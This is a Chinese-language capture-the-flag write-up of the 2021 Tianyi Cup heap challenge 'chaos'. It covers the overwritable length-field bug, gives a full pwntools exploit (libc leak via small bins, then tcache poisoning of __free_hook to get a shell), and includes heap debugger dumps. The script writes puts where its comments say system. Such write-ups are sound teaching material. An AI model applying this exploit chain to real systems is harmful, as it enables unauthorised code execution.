

# 2021 天翼杯 pwn: chaos

> 2021第二届“天翼杯”网络安全攻防大赛 pwn
>
> challenge name: chaos
>
> file: chall, libc-2.27.so
>
> ld277-3ubuntu1.so and .i64 with comments provided
>
> Description: try to exploit the hidden logic!
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16    thank liwl

len字段在create的buf的+512B处，buf分配的最大size为520B。create时len字段在分配大小为520时会被覆盖，而edit时是根据len字段来决定可edit的长度，故可以实现buf后的越界写。show方法内调用puts来输出内容，故只要不遇到空白符，可以越界读。

1. 多次create，使得chunk进入unsorted bin，后续分配时，一个chunk进入small bin
2. small bin里面的chunk的fd有libc上的地址，利用edit越界写 覆盖前面的空白符，泄露这个地址，从而计算出基地址
3. 利用edit越界写编辑tcache内chunk的指针，指向`__free_hook`的地址，改`__free_hook`的值为`libc.symbols["system"]`
4. 用一个内容为`"/bin/sh\0"`的chunk，触发`__free_hook`，`system("/bin/sh")` getshell

# Pre Analysis

```python
[*] '/home/kali/CTF/tianyi/chaos/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开

libc版本：

```bash
file libc-2.27.so
libc-2.27.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce450eb01a5e5acc7ce7b8c2633b02cc1093339e, for GNU/Linux 3.2.0, stripped
strings libc-2.27.so| grep GLIBC
.....
GLIBC_2.27
GLIBC_PRIVATE
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
```

ld277-3ubuntu1.so是网上下载下来的，其对应的libc的sha1值并不与题目提供的libc sha1相同，故实际版本有出入，但是本地调试时，将`system`改成`puts`时可以输出"/bin/sh"，即不影响本地调试

# IDA Analysis

输入格式应类似于`"opcode: 1\npasswd: Cr4at30\n\n"`, opcode后的数字决定调用哪个handler，handler内会检查passwd是否与存储在bss区上的既定字符串相等。

Vulnerability: create方法中，len字段存储在512B的位置，但是len最大可以取520B，read时会将len字段覆盖掉。程序中利用到的漏洞点有：

1. create: 申请520B空间时，len字段被覆盖
2. show: 调`puts`输出
3. edit: 使用512B处记录的len来决定read的长度，导致len被修改时，可以read任意长度，越界写入后面的chunks

create函数：

```c
unsigned __int64 __fastcall create(const char *a1)
{
  int len; // [rsp+14h] [rbp-2Ch]
  __int64 buf; // [rsp+18h] [rbp-28h]
  char *arr_ptr_ori; // [rsp+20h] [rbp-20h]
  char s[12]; // [rsp+2Ch] [rbp-14h] BYREF
  unsigned __int64 v6; // [rsp+38h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  if ( strcmp(a1, "Cr4at3") )
  {
    puts("error.");
    exit(5);
  }
  printf(">>> ");
  memset(s, 0, sizeof(s));
  read(0, s, 11uLL);
  len = atoi(s);
  if ( len <= 0 || len > 520 )                  // len 最大520
  {
    puts("error.");
    exit(5);
  }
  buf = (__int64)malloc(528uLL);                // 实际上分配出来的大小是544=0x220
  *(_QWORD *)(buf + 520) = 0LL;
  arr_ptr_ori = (char *)arr_ptr;
  arr_ptr = buf;
  *(_QWORD *)(buf + 520) = arr_ptr_ori;         // [rax+208h], rdx 把arr_ptr往后移，相当于往链表头插入指针
  *(_DWORD *)(buf + 512) = len;                 // [rax+200h], edx 长度最长为520B
  printf(">>> ");
  read(0, (void *)buf, *(unsigned int *)(buf + 512));// vul: 用512B处的内容作为len，但是这是可以读入覆盖的
  return __readfsqword(0x28u) ^ v6;
}
```



# Exploit

```python
from pwn import *

context.log_level = 'debug'
# libc = ELF("libc-2.27.so")

libc = ELF("./libc-2.27.so")
# sh = process(["./ld-2.27.so", "./chall"], env={"LD_PRELOAD": "./libc-2.27.so"})
sh = process(["./ld277-3ubuntu1.so", "./chall"], env={"LD_PRELOAD": "./libc-2.27.so"})
# sh = remote("8.134.97.12", 26756)


def create(size, content):
    sh.sendafter(">>> ", "opcode: 1\npasswd: Cr4at30\n\n")
    sh.sendafter(">>> ", str(size))
    sh.sendafter(">>> ", content)


def show(idx):
    sh.sendafter(">>> ", "opcode: 2\npasswd: SH0w0\n\n")
    sh.sendafter(">>> ", str(idx))
    return sh.recvuntil('\n', drop=True)


def edit(idx, content):
    sh.sendafter(">>> ", "opcode: 3\npasswd: Ed1t0\n\n")
    sh.sendafter(">>> ", str(idx))
    sh.sendafter(">>> ", content)


def delete(idx):
    sh.sendafter(">>> ", "opcode: 4\npasswd: D3l4te0\n\n")
    sh.sendafter(">>> ", str(idx))


# Step-1: Leak Libc using Small Bins
for i in range(9):  # create 0~8
    create(520, 'A')  # malloc(528uLL) chunk size=544=0x220
for i in range(7):  # delete 8~2 # full tcache(0x220) size=7
    delete(8 - i)

delete(0)  # to unsorted bin chunk*1(0x220)
delete(0)  # unsorted bin chunk(0x220, 0x200)  0x200??? some chunk take 0x20???

# malloc from tcache, tcache(0x220) size=6
create(520, b"deadbeef0000".ljust(520, b'B'))
# after: unsorted bin chunk*1(0x1e0)  small_bins[33]: chunk*1(size=0x220)


# before edit: chunk0*(deadbeef0000), 0x20chunk, 0x220chunk(in small bin), 0x20chunk .... top chunk
edit(0, b"deadbeef0000".ljust(0x240, b'B'))  # full addr bafore libc addr with 'B'
# small_bins[33]: fw=0x5555565bd230, bk=0x5555565bd230 Chunk(addr=0x5555565bd240, size=0x6161616161616160

leak_data = show(0)[0x240:]  # leak addr in libc through a chunk in small bins
libc.address = u64(leak_data.ljust(8, b'\x00')) - 0x00007f7c48fe9eb0 + 0x00007f7c48bfe000  # -0x3ebeb0
#  -(leak addr)+(libc base addr in vmmap)
print(hex(libc.address))


# Step-2:  Cover fd of the Chunk in Tcache into`__free_hook`
# recover size of chunk in small bin to 0x221 (display in heap bins is 0x220)
edit(0, b"deadbeef0000".ljust(208, b'B').ljust(0x238, b'\x00') + p64(0x221))  # 520=0x208

create(520, b"deadbeef1111".ljust(512, b'b'))  # tcache(0x220) size=5 # this chunk is in idx=0 now


delete(1)  # delete chunk(deadbeef0000) # tcache(0x220) -> chunk(deadbeef0000) -> ...
delete(0)  # delete chunk(deadbeef1111) # tcache(0x220) -> chunk(deadbeef1111) -> chunk(deadbeef0000) -> ...

create(520, b"deadbeef1111".ljust(520, b'b'))  # malloc back chunk(deadbeef1111) from tcache # idx=0
# tcache(0x220) -> chunk(deadbeef0000) -> ...
# cover the fd field of the 1st chunk(deadbeef0000) in tcache into __free_hook
edit(0, b"deadbeef1111".ljust(520, b'b').ljust(0x238, b'\x00') + p64(0x221) + p64(libc.symbols["__free_hook"]))
# tcache(0x220) -> chunk(deadbeef0000) -> __free_hook
gdb.attach(sh)  # gdb


# Step-3: Getshell
create(520, "/bin/sh\0")  # get 1st chunk(deadbeef0000) in tcache # idx=1
# tcache(0x220) -> __free_hook
create(520, p64(libc.symbols["puts"]))  # system # get __free_hook's addr and modify __free_hook to system
# this chunk's addr is __free_hook # __free_hook's value = libc.symbols["system"]


delete(1)  # "/bin/sh\0" chunk'idx=1 # equal to call system("/bin/sh")
# trriger __free_hook: system("/bin/sh")
sh.interactive()

```



# Step-1: Leak Libc using Small Bins

1. create 9个size=544=0x220的chunk
2. delete 7次，填满tcache
3. delete 2次，unsorted bin有两个chunk (0x220, 0x200)，程序用于对比passwd的拿走0x20
4. `create(520, b"deadbeef".ljust(520, b'B'))`: create 1个0x220的chunk。此时`unsorted bin chunk*1(0x1e0)  small_bins[33]: chunk*1(size=0x220)`

此时这个chunk0 (deadbeef标识的) 的len字段为0x4242424242424242，gdb调试时可以看到后面跟着一个0x21的chunk，再后面一个0x221的chunk的fd bk域是libc上的指针。而edit方法是调用puts输出的，所以只需将libc和chunk0之间的地址填充为非空白符，即可leak libc address。

在edit:  `edit(0, b"deadbeef".ljust(0x240, b'B'))`  前：

```python
gef➤  heap chunks
...........
Chunk(addr=0x555556db3000, size=0x220, flags=PREV_INUSE) # !!!! chunk0
    [0x0000555556db3000     64 65 61 64 62 65 65 66 42 42 42 42 42 42 42 42    deadbeefBBBBBBBB]
Chunk(addr=0x555556db3220, size=0x20, flags=PREV_INUSE)
    [0x0000555556db3220     43 72 34 61 74 33 00 00 00 00 00 00 00 00 00 00    Cr4at3..........]
Chunk(addr=0x555556db3240, size=0x220, flags=PREV_INUSE)
    [0x0000555556db3240     b0 3e 5e 34 d6 7f 00 00 b0 3e 5e 34 d6 7f 00 00    .>^4.....>^4....]
Chunk(addr=0x555556db3460, size=0x20, flags=)
    [0x0000555556db3460     43 72 34 61 74 33 00 00 00 00 00 00 00 00 00 00    Cr4at3..........]
Chunk(addr=0x555556db3480, size=0x20, flags=PREV_INUSE)
    [0x0000555556db3480     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db34a0, size=0x20, flags=PREV_INUSE)
    [0x0000555556db34a0     43 72 34 61 74 33 00 00 00 00 00 00 00 00 00 00    Cr4at3..........]
Chunk(addr=0x555556db34c0, size=0x1e0, flags=PREV_INUSE)
    [0x0000555556db34c0     a0 3c 5e 34 d6 7f 00 00 a0 3c 5e 34 d6 7f 00 00    .<^4.....<^4....]
Chunk(addr=0x555556db36a0, size=0x20, flags=)
    [0x0000555556db36a0     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db36c0, size=0x20, flags=PREV_INUSE)
    [0x0000555556db36c0     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db36e0, size=0x20, flags=PREV_INUSE)
    [0x0000555556db36e0     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db3700, size=0x20, flags=PREV_INUSE)
    [0x0000555556db3700     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db3720, size=0x20, flags=PREV_INUSE)
    [0x0000555556db3720     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db3740, size=0x20, flags=PREV_INUSE)
    [0x0000555556db3740     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db3760, size=0x20, flags=PREV_INUSE)
    [0x0000555556db3760     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db3780, size=0x20, flags=PREV_INUSE)
    [0x0000555556db3780     44 33 6c 34 74 65 00 00 00 00 00 00 00 00 00 00    D3l4te..........]
Chunk(addr=0x555556db37a0, size=0x1f870, flags=PREV_INUSE)  ←  top chunk
gef➤  heap bins
──────────────────────── Tcachebins for thread 1 ──────── # create 1 after full tcache
Tcachebins[idx=32, size=0x220] count=6  ←  Chunk(addr=0x555556db2dc0, size=0x220, flags=PREV_INUSE)  ←  Chunk(addr=0x555556db2b80, size=0x220, flags=PREV_INUSE)  ←  Chunk(addr=0x555556db2940, size=0x220, flags=PREV_INUSE)  ←  Chunk(addr=0x555556db2700, size=0x220, flags=PREV_INUSE)  ←  Chunk(addr=0x555556db24c0, size=0x220, flags=PREV_INUSE)  ←  Chunk(addr=0x555556db2280, size=0x220, flags=PREV_INUSE) 
───────────────────────── Unsorted Bin for arena '*0x7fd6345e3c40' ───────────────────────────
[+] unsorted_bins[0]: fw=0x555556db34b0, bk=0x555556db34b0
 →   Chunk(addr=0x555556db34c0, size=0x1e0, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
────────────────────────── Small Bins for arena '*0x7fd6345e3c40' ─────────────────────────────
[+] small_bins[33]: fw=0x555556db3230, bk=0x555556db3230
 →   Chunk(addr=0x555556db3240, size=0x220, flags=PREV_INUSE)  # this chunk after chunk0
[+] Found 1 chunks in 1 small non-empty bins.
────────────────────── Large Bins for arena '*0x7fd6345e3c40' ──────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x /80xg 0x555556db3000 -0x10
0x555556db2ff0: 0x0000000000000000      0x0000000000000221 # chunk0(deadbeef) size=0x221
0x555556db3000: 0x6665656264616564      0x4242424242424242 # deadbeefBBBB...
0x555556db3010: 0x4242424242424242      0x4242424242424242
...... # BBBBBBBB......
0x555556db31f0: 0x4242424242424242      0x4242424242424242
0x555556db3200: 0x4242424242424242      0x0000000000000000 # edit target:填充这里的puts截断符
0x555556db3210: 0x0000000000000000      0x0000000000000021 # a 0x21 chunk
0x555556db3220: 0x0000337461347243      0x0000000000000000
0x555556db3230: 0x0000000000000000      0x0000000000000221 # a 0x221 chunk
0x555556db3240: 0x00007fd6345e3eb0      0x00007fd6345e3eb0 # addr in libc
0x555556db3250: 0x0000000000000000      0x0000000000000000 # edit target:输出上面这两个libc addr
0x555556db3260: 0x0000000000000000      0x0000000000000000
```

计算libc基址：根据泄露的libc上的地址与libc基址的相对不变性

curent libc base = curent leak addr - (leak_addr1) + (libc_base1 addr in vmmap)



# Step-2: Cover fd of the Chunk in Tcache into`__free_hook`

1. 首先恢复前面改的small bin里的chunk的size
2. 为调试方便，再从tcache(0x220)中malloc一个520大小的chunk
3. free掉手上的两个chunk，此时tcache(0x220)size=7 -> chunk(deadbeef1111) -> chunk(deadbeef0000) -> ...
4. 从tcache中拿出一个chunk，通过edit修改tcache 1st chunk的fd，使其指向__free_hook

此时`tcache(0x220) -> chunk(deadbeef0000) -> __free_hook`

```python
# Step-2:  Cover fd of the Chunk in Tcache into`__free_hook`
# recover size of chunk in small bin to 0x221 (display in heap bins is 0x220)
edit(0, b"deadbeef0000".ljust(208, b'B').ljust(0x238, b'\x00') + p64(0x221))  # 520=0x208

create(520, b"deadbeef1111".ljust(512, b'b'))  # tcache(0x220) size=5 # this chunk is in idx=0 now


delete(1)  # delete chunk(deadbeef0000) # tcache(0x220) -> chunk(deadbeef0000) -> ...
delete(0)  # delete chunk(deadbeef1111) # tcache(0x220) -> chunk(deadbeef1111) -> chunk(deadbeef0000) -> ...

create(520, b"deadbeef1111".ljust(520, b'b'))  # malloc back chunk(deadbeef1111) from tcache # idx=0
# tcache(0x220) -> chunk(deadbeef0000) -> ...
# cover the fd field of the 1st chunk(deadbeef0000) in tcache into __free_hook
edit(0, b"deadbeef1111".ljust(520, b'b').ljust(0x238, b'\x00') + p64(0x221) + p64(libc.symbols["__free_hook"]))
# tcache(0x220) -> chunk(deadbeef0000) -> __free_hook
```

# Step-3: Getshell

1. 先拿出tcache(0x220)的第一个chunk，使其内容为`"/bin/sh\0"`，此时tcache(0x220)的链表头指针指向`__free_hook`，根据分析，这个chunk的idx=1
2. 再malloc一次，拿到`__free_hook`的地址，并修改其值为`libc.symbols["system"]`
3. delete(1)，触发`__free_hook`，调用`system("/bin/sh")`

```python
# Step-3: Getshell
create(520, "/bin/sh\0")  # get 1st chunk(deadbeef0000) in tcache # idx=1
# tcache(0x220) -> __free_hook
create(520, p64(libc.symbols["puts"]))  # system # get __free_hook's addr and modify __free_hook to system
# this chunk's addr is __free_hook # __free_hook's value = libc.symbols["system"]
delete(1)  # "/bin/sh\0" chunk'idx=1 # equal to call system("/bin/sh")
# trriger __free_hook: system("/bin/sh")
```

